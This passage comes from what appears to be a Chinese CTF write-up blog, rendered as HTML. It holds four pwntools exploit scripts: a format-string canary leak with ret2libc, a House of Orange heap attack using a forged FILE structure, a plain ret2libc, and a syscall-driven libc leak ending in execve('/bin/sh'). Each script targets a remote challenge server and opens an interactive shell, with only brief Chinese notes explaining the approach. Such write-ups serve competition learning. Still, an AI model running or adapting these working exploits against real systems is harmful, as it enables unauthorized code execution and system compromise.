class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">26250</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;By the way, can you tell me your name before that?\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>get_canary = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">b&quot;%29$p&quot;</span> + <span class="hljs-string">b&quot;%15$p&quot;</span> + <span class="hljs-string">b&quot;%13$p&quot;</span> + <span class="hljs-string">b&quot;%11$p&quot;</span> + <span class="hljs-string">b&quot;0x\x00&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;Great, I&#x27;ve decided to give you a gift!\n&quot;</span>, get_canary)<br>io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;canary&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br>stack = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>) - <span class="hljs-number">0x160</span><br>log.success(<span class="hljs-string">f&quot;stack&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stack)&#125;</span>&quot;</span>)<br>main = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;main&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(main)&#125;</span>&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>) <br>log.success(<span class="hljs-string">f&quot;libc_start&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br>libc_base = libc_base - libc.sym[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">128</span>+<span class="hljs-number">176</span><br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = pop_rdi+<span class="hljs-number">1</span><br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;puts&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>off = stack&amp;<span class="hljs-number">0xff</span><br><br><br>payload1 = p64(canary) + <span class="hljs-string">b&quot;e&quot;</span>*<span class="hljs-number">8</span> + p64(main) + p64(canary) + p8(off)<br>io.recvuntil(<span class="hljs-string">b&quot;again?????\n&quot;</span>)<br>sleep(<span class="hljs-number">3</span>)<br>io.send(payload1)<br><br><br>payload2 = <span class="hljs-string">b&quot;c&quot;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">0x8</span>)<br>payload2 += p64(canary)+ <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span> \<br>+ p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;By the way, can you tell me your name before that?\n&quot;</span>, \<br>    payload2)<br>io.sendafter(<span class="hljs-string">b&quot;Great, I&#x27;ve decided to give you a gift!\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;again?????\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h4><p>ByteCTF2024原题，只不过去了符号表、加了花指令。nop掉花指令后分析，发现没有free，考虑<code>house of orange</code>攻击，利用unsorted bin泄露libc和堆地址后打IO即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>    p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>    p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():<br>    <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">32784</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>menu = <span class="hljs-string">b&quot;Enter \n&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;1&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size\n&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;3&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;index\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size, payload:<span class="hljs-built_in">bytes</span></span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;4&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;index\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;size\n&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;input\n&quot;</span>, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#0</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x110</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(<span class="hljs-number">0xca1</span>))<br>    add(<span class="hljs-number">0x1000</span>)<span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0xc70</span>)<span class="hljs-comment">#2</span><br>    show(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;2: &#x27;</span>)<br>    libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3ebca0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>    stdout = libc.address+<span class="hljs-number">0x3ec760</span><br>    wfile_jump = libc.address+<span class="hljs-number">0x3e7d60</span><br>    add(<span class="hljs-number">0xdb0</span>)<span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#4</span><br>    edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x211</span>))<br>    add(<span class="hljs-number">0xdc0</span>)<span class="hljs-comment">#5</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#6</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x211</span>))<br>    add(<span class="hljs-number">0x1000</span>)<span class="hljs-comment">#7</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x1f1</span>)+p64(stdout))<br>    fake_io = flat(&#123;<br>        <span class="hljs-number">0x0</span>: <span class="hljs-string">b&#x27; sh&#x27;</span>,<br>        <span class="hljs-number">0xa0</span>: p64(stdout-<span class="hljs-number">0x130</span>+<span class="hljs-number">0xd8</span>),<br>        <span class="hljs-number">0x10</span>: p64(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        <span class="hljs-number">0x20</span>: p64(stdout),<br>        <span class="hljs-number">0x98</span>: p64(stdout-<span class="hljs-number">0x20</span>+<span class="hljs-number">0x80</span>),<br>        <span class="hljs-number">0xd8</span>: p64(wfile_jump + <span class="hljs-number">0x48</span> - <span class="hljs-number">0x38</span>),<br>        <span class="hljs-number">0x60</span>: <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>,<br>        <span class="hljs-number">0x80</span>: p64(libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]),<br>        <span class="hljs-number">0x88</span>: p64(stdout - <span class="hljs-number">0x30</span>),<br>        <span class="hljs-number">0xe0</span>: p64(stdout - <span class="hljs-number">8</span>),<br>    &#125;, filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    add(<span class="hljs-number">0x1e0</span>)<span class="hljs-comment">#8</span><br>    add(<span class="hljs-number">0x1e0</span>)<span class="hljs-comment">#9</span><br>    edit(<span class="hljs-number">9</span>,<span class="hljs-built_in">len</span>(fake_io),fake_io)<br>    p.interactive()<br>pwn()<br></code></pre></td></tr></table></figure><h4 id="小蓝鲨stack"><a href="#小蓝鲨stack" class="headerlink" title="小蓝鲨stack"></a>小蓝鲨stack</h4><p>ret2libc板子。注意printf需要栈对齐，也包括重启main后的printf，需要用ret对齐。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main&quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">36450</span>)<br>main = <span class="hljs-number">0x4011df</span><br>puts_got = e.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x401293</span><br>ret = <span class="hljs-number">0x401294</span><br><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(puts_got) \<br>    +p64(ret) +p64(puts_plt) + p64(ret)+ p64(main) <br>io.send(payload)<br>io.recvuntil(<span class="hljs-string">b&quot;\x40&quot;</span>)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;printf&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(binsh_addr) \<br>    + p64(ret) + p64(system_addr)<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h4><p>给了3次syscall的机会，利用<code>shmget</code>+<code>shmat</code>leak libc，拿出<code>/bin/sh</code>地址，再<code>execve</code>即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+64)</span><br><span class="hljs-comment">#                b *(*main+312)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">20415</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;29&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;1000&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;8630&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;30&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;result:&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;RAX: &quot;</span>)<br>printf_addr = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;000&quot;</span>).decode()[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>) - <span class="hljs-number">2144528</span> + <span class="hljs-number">0xa000</span><br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr+<span class="hljs-number">2144528</span>-<span class="hljs-number">0xa000</span>)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)<br>libc_base = printf_addr - libc.sym[<span class="hljs-string">&quot;printf&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>payload = <span class="hljs-built_in">str</span>(binsh_addr).encode()<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;59&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, payload)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;: &quot;</span>, <span class="hljs-string">b&quot;0&quot;</span>)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
